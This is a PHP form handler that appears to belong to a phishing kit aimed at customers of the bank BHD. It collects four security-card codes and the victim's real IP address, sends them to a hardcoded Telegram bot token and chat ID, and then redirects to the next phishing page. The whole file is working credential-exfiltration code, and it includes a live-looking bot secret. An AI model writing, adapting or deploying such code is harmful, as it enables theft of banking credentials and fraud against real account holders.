<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $co1 = $_POST["co1"] ?? '';
    $co2 = $_POST["co2"] ?? '';
    $co3 = $_POST["co3"] ?? '';
    $co4 = $_POST["co4"] ?? '';

    // OBTENER IP PÚBLICA REAL
    $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
    } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    }

    $botToken = "8857815714:AAFp5JutGMJPmwrZf5NwiigjazGNVbnJEB4";
    $chatID = "8555745789";

    $message = "=====CÓDIGOS 2 BHD=======\n";
    $message .= "31: $co1\n";
    $message .= "20: $co2\n";
    $message .= "14: $co3\n";
    $message .= "5: $co4\n";
    $message .= "IP del cliente: $ip";

    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = array("chat_id" => $chatID, "text" => $message);
    $options = array(
        "http" => array(
            "method" => "POST",
            "header" => "Content-Type: application/x-www-form-urlencoded\r\n",
            "content" => http_build_query($data)
        )
    );
    $context = stream_context_create($options);
    @file_get_contents($url, false, $context);

    header("Location: pa04.php");
    exit;
}
?>
